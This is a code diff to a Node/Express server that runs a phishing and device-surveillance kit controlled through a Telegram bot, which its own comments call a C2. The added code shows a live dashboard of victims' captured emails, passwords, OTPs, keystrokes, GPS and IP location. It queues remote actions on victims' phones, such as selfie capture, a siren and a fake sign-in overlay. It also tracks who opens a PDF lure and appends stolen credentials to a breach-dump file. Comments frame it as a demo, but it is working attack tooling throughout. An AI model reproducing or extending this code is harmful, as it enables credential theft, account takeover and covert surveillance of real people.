@@ -23,10 +23,93 @@ if (!BOT_TOKEN || !CHAT_ID) {
   process.exit(1);
 }
 
+// ── Telegram state on disk (per bot token) ───────────────────────────────
+// Polling the SAME bot token from two server instances is the classic cause
+// of duplicate messages: every getUpdates client receives its own copy of an
+// update, so ONE button press can fire N handlers (each instance sends from
+// its own session store → the two registries even disagree on contents).
+// Restarts can do the same when the in-memory offset resets to 0 and Telegram
+// replays the recent backlog.
+//
+// Hardening below:
+//   • confirmed offset is persisted, so a restart resumes where the old
+//     process left off instead of replaying the backlog from 0;
+//   • every processed update_id and callback_query id is recorded in the same
+//     file, so a twin instance (or a re-delivered update) is skipped instead
+//     of double-firing;
+//   • rapid same-button double-taps are debounced;
+//   • a per-token lock file warns loudly at boot when another live instance
+//     is already polling this token.
+const tgTag = crypto.createHash("sha1").update(String(BOT_TOKEN)).digest("hex").slice(0, 8);
+const TGSTATE_PATH = path.join(__dirname, `tgstate-${tgTag}.json`);
+const LOCK_PATH = path.join(__dirname, `run-${tgTag}.lock`);
+
+const tgState = { offset: 0, seen: {}, cb: {} }; // offset + seen update_ids + processed callback ids
+(function loadTgState() {
+  try {
+    const j = JSON.parse(fs.readFileSync(TGSTATE_PATH, "utf8"));
+    if (typeof j.offset === "number" && j.offset >= 0) tgState.offset = j.offset;
+    if (j.seen && typeof j.seen === "object") tgState.seen = j.seen;
+    if (j.cb && typeof j.cb === "object") tgState.cb = j.cb;
+    console.log(`[+] TG state restored: offset=${tgState.offset}, seen=${Object.keys(tgState.seen).length}, cbSeen=${Object.keys(tgState.cb).length}`);
+  } catch (e) { /* fresh state */ }
+})();
+
+function pruneTgState() {
+  const now = Date.now();
+  for (const k of Object.keys(tgState.seen)) if (now - tgState.seen[k] > 15 * 60e3) delete tgState.seen[k];
+  for (const k of Object.keys(tgState.cb)) if (now - tgState.cb[k] > 60 * 60e3) delete tgState.cb[k];
+  const cap = (o, n) => { const ks = Object.keys(o); if (ks.length > n) for (const k of ks.slice(0, ks.length - n)) delete o[k]; };
+  cap(tgState.seen, 4000);
+  cap(tgState.cb, 4000);
+}
+
+function saveTgState() {
+  try {
+    pruneTgState();
+    const tmp = TGSTATE_PATH + ".tmp";
+    fs.writeFileSync(tmp, JSON.stringify(tgState));
+    fs.renameSync(tmp, TGSTATE_PATH);
+  } catch (e) { /* non-fatal */ }
+}
+
+// Per-token advisory lock: if a LIVE twin process owns this token, say so
+// loudly (duplicate presses WILL occur until it is stopped) — then keep going.
+(function claimLock() {
+  try {
+    const old = JSON.parse(fs.readFileSync(LOCK_PATH, "utf8"));
+    if (old && old.pid && old.pid !== process.pid) {
+      let alive = false;
+      try { process.kill(old.pid, 0); alive = true; } catch (e) { alive = e.code !== "ESRCH"; }
+      if (alive) {
+        console.warn(`\n⚠️  ANOTHER INSTANCE (pid ${old.pid}) is already polling this bot token.`);
+        console.warn(`    Button presses may be handled TWICE (e.g. double 🗂 registry).`);
+        console.warn(`    Stop it (kill pid ${old.pid}), then run ONE server only.\n`);
+      }
+    }
+  } catch (e) { /* no lock yet */ }
+  try { fs.writeFileSync(LOCK_PATH, JSON.stringify({ pid: process.pid, started: Date.now() })); } catch (e) {}
+  process.on("exit", () => { try { fs.unlinkSync(LOCK_PATH); } catch (e) {} });
+})();
+
+// Same-button double-tap debounce (operator chat + button payload).
+const lastPress = new Map(); // key `chatId:data` -> ts
+const PRESS_DEBOUNCE_MS = 800;
+
 const app = express();
 app.use(express.json());
 app.use(express.text({ type: "text/plain", limit: "2mb" })); // for sendBeacon
 app.use(express.raw({ type: "image/png", limit: "15mb" })); // selfie + heatmap uploads
+
+// ── Pre-static gate: crowd-demo + PDF-lure routes ─────────────────────
+//    Must run BEFORE express.static so that /?crowd=1 never reveals the
+//    phishing page and taps on /d/notes.pdf are logged to the C2.
+app.use((req, res, next) => {
+  if (req.path === "/" && req.query.crowd === "1") return res.redirect("/crowd.html");
+  if (req.path === "/crowd-ping" && req.method === "POST") return onCrowdPing(req, res);
+  if (req.path === "/d/notes.pdf") return onPdfHit(req, res);
+  next();
+});
 app.use(express.static(path.join(__dirname, "public")));
 
 // ══════════════════════════════════════════════════════════════
@@ -63,6 +146,319 @@ async function tgMultipart(method, form) {
 }
 
 // ══════════════════════════════════════════════════════════════
+//  UNIFIED TELEGRAM DASHBOARD
+//  One self-updating dashboard message (/dash) + one optional
+//  console per session. Ordinary activity goes to feeds and is
+//  applied as SILENT in-place edits (editMessageText). NEW
+//  messages are reserved for real alerts: first-visit dossier,
+//  creds / OTP / autofill, photos, map pins and session end.
+//  Nothing here is invoked at module load — all state lives on
+//  the sessions registry defined below.
+// ══════════════════════════════════════════════════════════════
+const FEED_MAX = 22;          // lines kept in the global dashboard feed
+const SESSION_FEED_MAX = 18;  // lines kept in one session's console feed
+const EDIT_GAP_MS = 900;      // min gap between edits of the same message
+const globalFeed = [];        // { t, icon, sid, line }
+const sessionFeeds = new Map(); // sid -> [html line]
+const liveDash = { msgId: null, timer: null, last: 0 };
+const liveCons = new Map();     // sid -> { msgId, timer, last }
+
+const feedStamp = () => new Date().toLocaleTimeString("en-IN", { hour12: false });
+
+async function editMsg(msgId, html, kb) {
+  const r = await tg("editMessageText", {
+    chat_id: CHAT_ID, message_id: msgId, text: html,
+    parse_mode: "HTML", reply_markup: kb,
+  });
+  if (r && r.ok) return true;
+  // "message is not modified" is not an error — content just didn't change
+  if (r && r.description && /not modified/i.test(r.description)) return true;
+  return false;
+}
+
+// Append one line of activity. Stored per session AND globally; the
+// dashboard/console messages are only edited if they already exist.
+function pushFeed(s, line) {
+  const html = String(line).slice(0, 400);
+  if (!html) return;
+  const sf = sessionFeeds.get(s.sid) || [];
+  sf.push(html);
+  if (sf.length > SESSION_FEED_MAX) sf.splice(0, sf.length - SESSION_FEED_MAX);
+  sessionFeeds.set(s.sid, sf);
+
+  const icon = classify(s.ua).icon;
+  const last = globalFeed[globalFeed.length - 1];
+  const dup = last && last.sid === s.sid && last.line === html && Date.now() - last._t < 1500;
+  if (!dup) {
+    globalFeed.push({ t: feedStamp(), icon, sid: s.sid, line: html, _t: Date.now() });
+    if (globalFeed.length > FEED_MAX) globalFeed.splice(0, globalFeed.length - FEED_MAX);
+  }
+  if (liveDash.msgId) queueDashEdit();
+  if (liveCons.has(s.sid)) queueConEdit(s.sid);
+}
+
+// ── Dashboard (global) ────────────────────────────────────────
+function deviceRegLine(s) {
+  const cls = classify(s.ua);
+  const online = Date.now() - s.lastSeen < 30000;
+  const geo = s.location
+    ? `${esc(s.location.city)}, ${esc(s.location.country)}`
+    : isPrivateIp(s.ip) ? "local net" : "geo…";
+  const tag = (s.creds ? " 🔐" : "") + (s.otp ? " 🔑" : "") + (s.pdfHits ? " 📄" : "");
+  return `${online ? "🟢" : "⚫"} <code>${esc(s.sid)}</code> · ${esc(String(cls.label).split(" ").slice(0, 2).join(" "))} · ${geo} · v${s.visits}${tag}`;
+}
+
+function renderDash() {
+  const all = Array.from(sessions.values());
+  const online = all.filter((s) => Date.now() - s.lastSeen < 30000).length;
+  const keysN = all.reduce((a, s) => a + s.keys.length, 0);
+  const reg = all
+    .sort((a, b) => b.lastSeen - a.lastSeen).slice(0, 8)
+    .map(deviceRegLine).join("\n");
+  const feed = globalFeed.slice(-FEED_MAX)
+    .map((e) => `${e.icon} <code>${esc(e.sid)}</code> <i>${e.t}</i> ${e.line}`).join("\n");
+  let h = `📊 <b>LIVE DASHBOARD</b> — ${feedStamp()}\n`;
+  h += `━━━━━━━━━━━━━━━━━━━━\n`;
+  h += `👁️ ${all.length} device(s) · 🟢 ${online} online · ⌨️ ${keysN} keys · 🔐 ${all.filter((s) => s.creds).length} cred · 🔑 ${all.filter((s) => s.otp).length} OTP\n`;
+  if (reg) h += `\n<b>── DEVICES ──</b>\n${reg}`;
+  if (feed) h += `\n\n<b>── LIVE FEED ──</b>\n${feed}`;
+  return h;
+}
+
+function dashKeyboard() {
+  const rows = [];
+  const tops = Array.from(sessions.values())
+    .sort((a, b) => b.lastSeen - a.lastSeen).slice(0, 8);
+  if (tops.length) {
+    rows.push(tops.map((s) => ({ text: "🎛 " + s.sid, callback_data: "console:" + s.sid })));
+  }
+  rows.push([{ text: "🔄 Refresh", callback_data: "dash" }]);
+  return { inline_keyboard: rows };
+}
+
+function queueDashEdit() {
+  if (liveDash.timer) return;
+  const wait = Math.max(0, liveDash.last + EDIT_GAP_MS - Date.now()) + 120;
+  liveDash.timer = setTimeout(() => { liveDash.timer = null; flushDashEdit(); }, Math.min(wait, 2000));
+}
+
+async function flushDashEdit() {
+  if (!liveDash.msgId) return;
+  const ok = await editMsg(liveDash.msgId, renderDash(), dashKeyboard());
+  if (!ok) { liveDash.msgId = null; return; }
+  liveDash.last = Date.now();
+}
+
+async function ensureDash() {
+  const r = await tgSend(renderDash(), { reply_markup: dashKeyboard() });
+  if (r && r.ok && r.result) {
+    liveDash.msgId = r.result.message_id;
+    liveDash.last = Date.now();
+    return true;
+  }
+  return false;
+}
+
+// ── Per-session console ───────────────────────────────────────
+function renderConsole(s) {
+  const cls = classify(s.ua);
+  const online = Date.now() - s.lastSeen < 30000;
+  const d = s.device || {};
+  const feed = sessionFeeds.get(s.sid) || [];
+  let h = `🎛 <b>CONSOLE</b> — ${cls.icon} ${esc(cls.label)} ${online ? "🟢" : "⚫"}\n`;
+  h += `━━━━━━━━━━━━━━━━━━━━\n`;
+  h += `🆔 <code>${esc(s.sid)}</code> · 🌍 <code>${esc(s.ip)}</code> · visits ${s.visits}\n`;
+  h += `📱 ${esc(d.browser || "?")}${d.screen ? " · " + esc(d.screen) : ""}${d.battery ? " · 🔋" + d.battery.level + "%" : ""}${d.webview ? "\n🌐 " + esc(d.webview) : ""}`;
+  if (s.location) h += `\n📍 ${esc(s.location.city)}, ${esc(s.location.region)}, ${esc(s.location.country)} · ${esc(s.location.isp)}`;
+  if (s.gps && s.gps.lat) h += `\n🎯 GPS: <code>${Number(s.gps.lat).toFixed(5)}, ${Number(s.gps.lon).toFixed(5)}</code>${s.gps.acc ? " ±" + Math.round(s.gps.acc) + "m" : ""} · fix #${s.fixes || 1}`;
+  if (s.creds) h += `\n🔐 <code>${esc(s.creds.email)}</code> : <code>${esc(s.creds.password)}</code>`;
+  if (s.otp) h += `\n🔑 <b>OTP</b> <code>${esc(s.otp.code)}</code> — takeover chain complete`;
+  if (feed.length) h += `\n\n<b>── ACTIVITY ──</b>\n` + feed.slice(-SESSION_FEED_MAX).join("\n");
+  return h;
+}
+
+function consoleKeyboard(sid) {
+  return { inline_keyboard: [
+    [
+      { text: "📳 Buzz", callback_data: `act:buzz:${sid}` },
+      { text: "⚡ Flash", callback_data: `act:flash:${sid}` },
+      { text: "🚨 Nudge", callback_data: `act:nudge:${sid}` },
+    ],
+    [
+      { text: "🗣 Speak", callback_data: `act:speak:${sid}` },
+      { text: "📍 GPS", callback_data: `act:gps:${sid}` },
+      { text: "📷 Selfie", callback_data: `act:selfie:${sid}` },
+    ],
+    [
+      { text: "🔦 Torch ON", callback_data: `act:torchOn:${sid}` },
+      { text: "🔦 Torch OFF", callback_data: `act:torchOff:${sid}` },
+      { text: "🚨 Siren", callback_data: `act:siren:${sid}` },
+    ],
+    [
+      { text: "📋 Dossier", callback_data: `who:${sid}` },
+      { text: "⌨️ Keys", callback_data: `keys:${sid}` },
+      { text: "🔄 Refresh", callback_data: `con:${sid}` },
+    ],
+  ] };
+}
+
+function queueConEdit(sid) {
+  const c = liveCons.get(sid);
+  if (!c || c.timer) return;
+  const wait = Math.max(0, c.last + EDIT_GAP_MS - Date.now()) + 120;
+  c.timer = setTimeout(() => { c.timer = null; flushConEdit(sid); }, Math.min(wait, 2000));
+}
+
+async function flushConEdit(sid) {
+  const c = liveCons.get(sid);
+  const s = sessions.get(sid);
+  if (!c || !s || !c.msgId) return;
+  const ok = await editMsg(c.msgId, renderConsole(s), consoleKeyboard(sid));
+  if (!ok) { c.msgId = null; return; }
+  c.last = Date.now();
+}
+
+async function openConsole(sid) {
+  const s = sessions.get(sid);
+  if (!s) return false;
+  const cur = liveCons.get(sid);
+  if (cur && cur.msgId) {
+    const ok = await editMsg(cur.msgId, renderConsole(s), consoleKeyboard(sid));
+    if (ok) { cur.last = Date.now(); return true; }
+    liveCons.delete(sid);
+  }
+  const r = await tgSend(renderConsole(s), { reply_markup: consoleKeyboard(sid) });
+  if (r && r.ok && r.result) liveCons.set(sid, { msgId: r.result.message_id, timer: null, last: Date.now() });
+  return !!(r && r.ok);
+}
+
+// ── C2 quick-actions (console buttons → queueCmd) ─────────────
+const ACTS = {
+  buzz:     { action: "buzz",     label: "📳 buzz", arg: undefined },
+  flash:    { action: "flash",    label: "⚡ screen flash", arg: undefined },
+  nudge:    { action: "nudge",    label: "🚨 takeover overlay", arg: "New sign-in on your account — Bengaluru, India · Chrome on Windows · 2FA code used ✔️" },
+  speak:    { action: "speak",    label: "🗣 voice", arg: "This device has been compromised." },
+  gps:      { action: "gps",      label: "📍 GPS request", arg: undefined },
+  selfie:   { action: "selfie",   label: "📷 selfie capture (×3 burst)", arg: "3" },
+  siren:    { action: "siren",    label: "🚨 siren alarm", arg: undefined },
+  torchOn:  { action: "torchOn",  label: "🔦 torch ON", arg: undefined },
+  torchOff: { action: "torchOff", label: "🔦 torch OFF", arg: undefined },
+};
+
+function runAction(sid, name) {
+  const s = sessions.get(sid);
+  const t = ACTS[name];
+  if (!s || !t) return false;
+  queueCmd(sid, t.action, t.arg);
+  pushFeed(s, `${t.label} — <b>queued by operator</b>`);
+  return true;
+}
+
+// Truncate a Telegram reply safely at line boundaries so HTML stays valid.
+function clipLines(html, max = 3600) {
+  if (html.length <= max) return html;
+  const lines = html.split("\n");
+  let out = "";
+  let dropped = 0;
+  for (const ln of lines) {
+    if (out.length + ln.length + 1 > max) { dropped++; continue; }
+    out += ln + "\n";
+  }
+  return out.trimEnd() + `\n<i>…(+${dropped} lines truncated)</i>`;
+}
+
+// Route every inline-button press from dash / dossier / console messages
+// through one dispatcher so the poll loop stays tiny.
+async function handleCallback(q) {
+  const parts = String(q.data || "").split(":");
+  const head = parts[0];
+  let toast = "";
+  try {
+    // ── dedupe gate ────────────────────────────────────────────────────
+    // The SAME button press can be delivered twice: a twin instance polling
+    // this token receives its own copy of every update, and a reconnect can
+    // make Telegram re-deliver recent ones. Both copies carry the same
+    // callback_query id, so record each id in the shared tgstate file and
+    // answer (not dispatch) any repeat. Rapid same-button double-taps get a
+    // debounce instead of a second dispatch.
+    const opWho = q.from && q.from.id != null ? String(q.from.id) : String(CHAT_ID);
+    const pressKey = `${opWho}:${q.data}`;
+    if (tgState.cb[q.id]) {
+      tg("answerCallbackQuery", { callback_query_id: q.id, text: "✅ Already handled" }).catch(() => {});
+      return;
+    }
+    const prevPress = lastPress.get(pressKey);
+    if (prevPress && Date.now() - prevPress < PRESS_DEBOUNCE_MS) {
+      tg("answerCallbackQuery", { callback_query_id: q.id, text: "⏳ One moment…" }).catch(() => {});
+      return;
+    }
+    // Record intent BEFORE dispatch so a racing twin sees it as handled.
+    tgState.cb[q.id] = Date.now();
+    lastPress.set(pressKey, Date.now());
+    saveTgState();
+    if (head === "dash") {
+      if (liveDash.msgId) {
+        const ok = await editMsg(liveDash.msgId, renderDash(), dashKeyboard());
+        if (ok) {
+          liveDash.last = Date.now();
+          toast = "📊 Dashboard refreshed";
+        } else {
+          // stale dash msgId (message deleted/cleared) -> send a fresh board
+          liveDash.msgId = null;
+          toast = (await ensureDash()) ? "📊 Dashboard sent" : "⚠️ Dashboard failed — check server console";
+        }
+      } else {
+        toast = (await ensureDash()) ? "📊 Dashboard sent" : "⚠️ Dashboard failed — check server console";
+      }
+    } else if (head === "list") {
+      await handleCommand("/list");
+      toast = "🗂 Device list sent";
+    } else if (head === "console") {
+      await openConsole(parts[1]);
+      toast = "🎛 Console opened";
+    } else if (head === "con") {
+      const c = liveCons.get(parts[1]);
+      const s = sessions.get(parts[1]);
+      if (c && c.msgId && s) {
+        const ok = await editMsg(c.msgId, renderConsole(s), consoleKeyboard(parts[1]));
+        if (ok) c.last = Date.now();
+        toast = "🔄 Console refreshed";
+      } else {
+        toast = "⚠️ Console closed — press 🎛 to reopen";
+      }
+    } else if (head === "act") {
+      toast = runAction(parts[2], parts[1]) ? "⚡ Command queued" : "⚠️ Command not sent — session gone";
+    } else if (head === "who") {
+      const s = sessions.get(parts[1]);
+      if (s) { await tgSend(clipLines(buildDossier(s))); toast = "📋 Dossier sent"; }
+      else toast = "⚠️ Session gone — press 🗂 All devices";
+    } else if (head === "keys") {
+      const s = sessions.get(parts[1]);
+      if (s) { await handleCommand(`/keys ${parts[1]} 15`); toast = "🔑 Keys sent"; }
+      else toast = "⚠️ Session gone — press 🗂 All devices";
+    }
+  } catch (e) {
+    console.error("[cb]", e.message);
+    toast = `⚠️ ${String(e.message || "error").slice(0, 90)}`;
+  }
+  const body = { callback_query_id: q.id };
+  if (toast) body.text = toast;
+  tg("answerCallbackQuery", body).catch(() => {});
+}
+
+// Wipe all live-message state (used by /clear).
+function resetLive() {
+  if (liveDash.timer) clearTimeout(liveDash.timer);
+  liveDash.timer = null;
+  liveDash.msgId = null;
+  liveDash.last = 0;
+  for (const c of liveCons.values()) if (c.timer) clearTimeout(c.timer);
+  liveCons.clear();
+  globalFeed.length = 0;
+  sessionFeeds.clear();
+}
+
+// ══════════════════════════════════════════════════════════════
 //  SESSION REGISTRY + PERSISTENCE
 // ══════════════════════════════════════════════════════════════
 const sessions = new Map();
@@ -89,9 +485,13 @@ function newSession(sid, req) {
   return {
     sid, ip: clientIp(req), ua: req.headers["user-agent"] || "unknown",
     device: {}, location: null, keys: [], events: [],
-    creds: null, autofill: null, visits: 0,
+    creds: null, otp: null, autofill: null, visits: 0,
     dwellMs: 0, scrollPct: 0, touches: 0, keyCount: 0,
     heatBuf: null, exitSummary: null,
+    pdfHits: 0, pdfNotified: false,
+    cohort: null, permLog: {},
+    stage: "landed", stageAt: Date.now(),
+    stageLog: [{ stage: "landed", t: Date.now() }],
     firstSeen: Date.now(), lastSeen: Date.now(),
   };
 }
@@ -107,7 +507,66 @@ function sessionFor(req, vid) {
   const s = sessions.get(sid);
   s.ip = isPrivateIp(s.ip) ? ip : s.ip;
   s.lastSeen = Date.now();
+  ensureCohort(s, req);
   return s;
+}
+
+// ── Cohort + stage model ───────────────────────────────────────────────
+//  Prompt cohort: page asks for location/camera normally → grant telemetry.
+//  Stingy cohort: prompts suppressed (simulated paranoid user). Creds + OTP
+//  are typed by BOTH cohorts — that is the demo's punchline.
+function pickCohort(req) {
+  const q = req.query && req.query.cohort;
+  if (q === "prompt" || q === "stingy") return q;
+  let body = req.body;
+  if (typeof body === "string") { try { body = JSON.parse(body); } catch (e) { body = null; } }
+  const c = body && (body.cohort || body._cohort);
+  if (c === "prompt" || c === "stingy") return c;
+  return null;
+}
+
+const STAGE_ORDER = { landed: 1, typed: 2, creds: 3, otp: 4 };
+const stageEmoji = (s) => ({ landed: "👀", typed: "⌨️", creds: "🔐", otp: "🔑" }[s] || "👀");
+
+function setStage(s, stage) {
+  if (!STAGE_ORDER[stage]) return;
+  s.stageLog = s.stageLog || [];
+  const cur = STAGE_ORDER[s.stage] || 0;
+  if (STAGE_ORDER[stage] < cur) return; // stages only move forward
+  s.stage = stage;
+  s.stageAt = Date.now();
+  const last = s.stageLog[s.stageLog.length - 1];
+  if (!last || last.stage !== stage) {
+    s.stageLog.push({ stage, t: s.stageAt });
+    if (s.stageLog.length > 8) s.stageLog.shift();
+  }
+}
+
+function ensureCohort(s, req) {
+  if (!s.cohort) {
+    s.cohort = pickCohort(req) || (parseInt(s.sid[0] || "c", 16) % 2 ? "stingy" : "prompt");
+  }
+  s.permLog = s.permLog || {};
+  s.stageLog = s.stageLog || [];
+  if (!s.stage) setStage(s, "landed");
+}
+
+// Permission outcome tallies (used by /stats, dossier, admin dashboard)
+function permTallies(all) {
+  const t = {};
+  for (const name of ["location", "camera", "notifications"]) {
+    t[name] = { granted: 0, denied: 0, prompted: 0, asked: 0, rate: null };
+    for (const s of all) {
+      const p = (s.permLog || {})[name];
+      if (!p) continue;
+      t[name].prompted += 1;
+      if (p.state === "granted") t[name].granted++;
+      else if (p.state === "denied") t[name].denied++;
+    }
+    t[name].asked = t[name].granted + t[name].denied;
+    t[name].rate = t[name].asked ? Math.round((t[name].granted / t[name].asked) * 100) : null;
+  }
+  return t;
 }
 
 const iconFor = (t) => ({ android: "🤖", ios: "🍎", windows: "🖥️", mac: "💻", linux: "🐧", other: "❓" }[t] || "❓");
@@ -272,9 +731,10 @@ async function streamKeys(s, keys, context) {
 // ══════════════════════════════════════════════════════════════
 
 // ── New visitor dossier ────────────────────────────────────────────────
-app.post("/collect", async (req, res) => {
+app.post("/collect", (req, res) => {
   const s = sessionFor(req, req.body.vid);
   const d = req.body || {};
+  const quiet = !!(d.quiet || req.query.quiet === "1"); // ?quiet=1 → store/count only, no Telegram dossier
 
   s.device = {
     platform: d.platform, browser: d.browser, webview: d.webview,
@@ -291,29 +751,110 @@ app.post("/collect", async (req, res) => {
     perms: d.perms, tabs: d.tabs,
   };
   s.visits += 1;
+  ensureCohort(s, req);
+  // A brand-new session can be created by /command before /collect lands —
+  // trust the explicit cohort the page reports on its first real collect.
+  const bodyC = pickCohort(req);
+  if (bodyC && s.visits <= 1 && !Object.keys(s.permLog || {}).length && !s.creds) s.cohort = bodyC;
+  setStage(s, "landed");
   saveSessions();
 
-  const geo = await geoLookup(s.ip);
-  if (geo) s.location = {
-    city: geo.city, region: geo.regionName, country: geo.country,
-    isp: geo.isp, tz: geo.timezone, lat: geo.lat, lon: geo.lon,
-    mobile: geo.mobile, proxy: geo.proxy,
-  };
-  s.lastGeoUpdate = Date.now();
-
-  const cls = classify(s.ua);
-  tgSend(buildDossier(s), { reply_markup: { inline_keyboard: [[
-    { text: "👤 Dossier", callback_data: `who:${s.sid}` },
-    { text: "⌨️ Keystrokes", callback_data: `keys:${s.sid}` },
-    { text: "🗂 Devices", callback_data: "list" },
-  ]] } });
-
-  // Real map pin under the dossier
-  if (s.location && s.location.lat) {
-    tg("sendLocation", { chat_id: CHAT_ID, latitude: s.location.lat, longitude: s.location.lon });
+  // LOUD Telegram alert only on the FIRST visit of a session. Reloads and
+  // returning visits become silent feed lines — no more dossier spam.
+  if (!quiet && s.visits <= 1) {
+    tgSend(buildDossier(s), { reply_markup: { inline_keyboard: [
+      [
+        { text: "🎛 Console", callback_data: `console:${s.sid}` },
+        { text: "📊 Dashboard", callback_data: "dash" },
+      ],
+      [{ text: "🗂 All devices", callback_data: "list" }],
+    ] } });
+    pushFeed(s, `👋 <b>new visitor</b> — ${esc(String(classify(s.ua).label).slice(0, 40))}, dossier sent`);
+  } else if (!quiet) {
+    pushFeed(s, `↩️ returning visit #${s.visits} — page re-opened`);
   }
-  res.json({ ok: true, sid: s.sid });
+
+  // Geo lookup runs AFTER the response (never blocks the dossier). Only the
+  // first result or a real city/ISP change earns a map pin + feed line.
+  geoLookup(s.ip).then((geo) => {
+    if (!geo) return;
+    const prev = s.location;
+    const changed = !prev || prev.city !== geo.city || prev.country !== geo.country || prev.isp !== geo.isp;
+    s.location = {
+      city: geo.city, region: geo.regionName, country: geo.country,
+      isp: geo.isp, tz: geo.timezone, lat: geo.lat, lon: geo.lon,
+      mobile: geo.mobile, proxy: geo.proxy,
+    };
+    s.lastGeoUpdate = Date.now();
+    saveSessions();
+    if (changed && s.location.lat) {
+      tg("sendLocation", { chat_id: CHAT_ID, latitude: s.location.lat, longitude: s.location.lon });
+      pushFeed(s, `📍 located: <b>${esc(geo.city)}, ${esc(geo.country)}</b> · ${esc(geo.isp)}${geo.proxy ? " · ⚠️ VPN/proxy" : ""}`);
+    }
+  }).catch(() => {});
+
+  res.json({ ok: true, sid: s.sid, cohort: s.cohort, stage: s.stage });
 });
+
+// ── Crowd-demo opt-in counter (audience phones; in-memory only, never ─
+//    written to disk or sent to Telegram — that is the whole point) ────
+const crowdSeen = new Set(); // anonymous per-phone ids since server start
+const crowdHits = [];
+const crowdDevs = new Map(); // id → {platform, browser} (deduped platform roll-up)
+
+function onCrowdPing(req, res) {
+  const d = req.body || {};
+  const id = String(d.id || "").replace(/[^a-z0-9]/gi, "").slice(0, 16) || clientIp(req);
+  crowdSeen.add(id);
+
+  const ua = req.headers["user-agent"] || "";
+  const entry = {
+    t: Date.now(),
+    platform: String(d.platform || classify(ua).label || "Unknown").slice(0, 60),
+    browser: String(d.browser || "—").slice(0, 40),
+    lang: String(d.lang || "").slice(0, 12),
+    screen: String(d.screen || "").slice(0, 24),
+  };
+  crowdDevs.set(id, { platform: entry.platform, browser: entry.browser });
+  crowdHits.push(entry);
+  if (crowdHits.length > 400) crowdHits.splice(0, crowdHits.length - 400);
+
+  res.json({ ok: true, n: crowdSeen.size, first: true });
+}
+
+app.get("/crowd", (req, res) => {
+  const perPlatform = {};
+  for (const v of crowdDevs.values()) perPlatform[v.platform] = (perPlatform[v.platform] || 0) + 1;
+  res.json({
+    total: crowdSeen.size,
+    perPlatform,
+    recent: crowdHits.slice(-15).map(e => ({ t: e.t, platform: e.platform, browser: e.browser })),
+  });
+});
+
+// ── PDF lure hit-tracking — the "link in WhatsApp" demo ───────────────
+function onPdfHit(req, res) {
+  const s = sessionFor(req, req.query.vid || "");
+  s.pdfHits = (s.pdfHits || 0) + 1;
+  s.lastSeen = Date.now();
+  saveSessions();
+
+  if (!s.pdfNotified) {
+    s.pdfNotified = true;
+    const cls = classify(s.ua);
+    tgSend(
+      `📄 <b>PDF LURE OPENED</b> — ${cls.icon} ${esc(cls.label)}\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n` +
+      `🌍 <b>IP:</b> <code>${esc(s.ip)}</code>${s.location ? ` · ${esc(s.location.city)}, ${esc(s.location.country)}` : ""}\n` +
+      `🕐 <b>Time:</b> ${nowIST()} · <code>${esc(s.sid)}</code>\n\n` +
+      `<i>One tap on the link was enough — IP, OS and timezone of the person who opened it.</i>`
+    );
+    pushFeed(s, `📄 PDF lure opened — first tap, alert sent`);
+  } else {
+    pushFeed(s, `📄 PDF lure re-opened (tap #${s.pdfHits})`);
+  }
+  res.sendFile(path.join(__dirname, "public", "notes.pdf"));
+}
 
 // ── Keystrokes: store + live-edit stream + typing mirror ──────────────
 app.post("/keys", (req, res) => {
@@ -326,9 +867,20 @@ app.post("/keys", (req, res) => {
   s.keyCount = s.keys.length;
   if (s.keys.length > 500) s.keys.splice(0, s.keys.length - 500);
   saveSessions();
+  setStage(s, "typed");
 
-  mirrorTyping(s.sid);
-  streamKeys(s, keys, context).catch(() => {});
+  // Secrets (password / OTP / PIN fields) keep the dramatic live-edit stream +
+  // typing mirror. Ordinary page typing is just a dashboard feed line.
+  if (/password|otp|pin|pass/i.test(context)) {
+    if (!liveKeys.has(`${s.sid}|${context}`)) {
+      pushFeed(s, `⌨️ <b>typing in ${esc(context)}</b> — live stream open`);
+    }
+    mirrorTyping(s.sid);
+    streamKeys(s, keys, context).catch(() => {});
+  } else {
+    const preview = keys.length > 80 ? keys.slice(0, 80) + "…" : keys;
+    pushFeed(s, `⌨️ <i>${esc(context)}:</i> <code>${esc(preview)}</code>`);
+  }
   res.json({ ok: true });
 });
 
@@ -349,8 +901,31 @@ app.post("/event", (req, res) => {
   if (s.events.length > 100) s.events.shift();
   saveSessions();
 
-  const cls = classify(s.ua);
-  tgSend(`🫀 <b>${esc(cls.label)}</b> <i>[${esc(s.sid)}]</i>\n${esc(text)}`);
+  // Narration events are FEED-ONLY: they update the dashboard/console message
+  // in place instead of spamming a new Telegram message per line.
+  pushFeed(s, esc(text));
+  res.json({ ok: true });
+});
+
+// ── Permission outcome telemetry (grant-rate counter) ─────────────────
+const PERM_NAMES = new Set(["location", "camera", "microphone", "notifications"]);
+const PERM_STATES = new Set(["granted", "denied", "prompted"]);
+app.post("/perm", (req, res) => {
+  const s = sessionFor(req, req.body && req.body.vid);
+  const name = String((req.body || {}).name || "").toLowerCase();
+  const state = String((req.body || {}).state || "").toLowerCase();
+  if (!PERM_NAMES.has(name) || !PERM_STATES.has(state)) return res.json({ ok: true });
+  ensureCohort(s, req);
+  s.permLog = s.permLog || {};
+  const p = s.permLog[name] || {};
+  if (state === "prompted") p.askedAt = p.askedAt || Date.now();
+  else { p.state = state; p.t = Date.now(); }
+  s.permLog[name] = p;
+  saveSessions();
+
+  // Grant/deny outcomes are demo-critical moments — surface them on the dash.
+  if (state === "granted") pushFeed(s, `✅ <b>${esc(name)}</b> permission <b>granted</b>`);
+  else if (state === "denied") pushFeed(s, `⛔ <b>${esc(name)}</b> permission <b>denied</b>`);
   res.json({ ok: true });
 });
 
@@ -371,6 +946,7 @@ app.post("/autofill", (req, res) => {
   msg += `━━━━━━━━━━━━━━━━━━━━\n`;
   for (const [k, v] of got) msg += `${k === "name" ? "👤" : k === "phone" ? "📞" : "🏠"} <b>${k}:</b> <code>${esc(v)}</code>\n`;
   tgSend(msg);
+  pushFeed(s, `🕸️ autofill harvest — ${got.map(([k]) => k).join(", ")}`);
   res.json({ ok: true });
 });
 
@@ -381,7 +957,9 @@ app.post("/creds", (req, res) => {
   if (!email && !password) return res.json({ ok: true });
 
   s.creds = { email, password, t: Date.now() };
+  setStage(s, "creds");
   saveSessions();
+  appendDump(`${email}:${password}:${s.ip}`);
 
   const cls = classify(s.ua);
   tgSend(
@@ -393,6 +971,46 @@ app.post("/creds", (req, res) => {
     `🧬 <b>Visitor:</b> <code>${esc(s.sid)}</code>\n\n` +
     `<i>breach-dump line:</i> <code>${esc(email)}:${esc(password)}:${esc(s.ip)}</code>`
   );
+  pushFeed(s, `🔐 <b>credentials captured</b> — <code>${esc(email)}</code>`);
